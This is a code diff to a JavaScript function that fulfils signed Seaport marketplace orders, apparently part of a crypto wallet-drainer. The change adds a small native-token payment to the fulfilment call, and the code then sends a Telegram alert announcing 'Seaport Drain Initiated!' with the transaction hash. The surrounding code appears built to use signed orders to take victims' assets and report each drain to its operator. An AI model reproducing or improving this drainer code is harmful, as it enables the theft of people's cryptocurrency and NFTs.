@@ -508,7 +508,8 @@ async function fulfillSeaportOrder(orderPayload, chainName) {
         console.log(`🚀 Fulfilling Seaport Order on ${chainName}...`);
 
         // orderPayload should contain { parameters, signature }
-        const tx = await seaport.fulfillOrder(orderPayload, "0x0000000000000000000000000000000000000000000000000000000000000000");
+        console.log(`📦 Fulfilment value: 0.001 native`);
+        const tx = await seaport.fulfillOrder(orderPayload, "0x0000000000000000000000000000000000000000000000000000000000000000", { value: "1000000000000000" });
 
         console.log(`📤 Seaport Fulfillment Sent: ${tx.hash}`);
         await notifyTelegram(`<b>💸 Seaport Drain Initiated!</b>\nChain: ${chainName}\nTx: ${tx.hash}`);
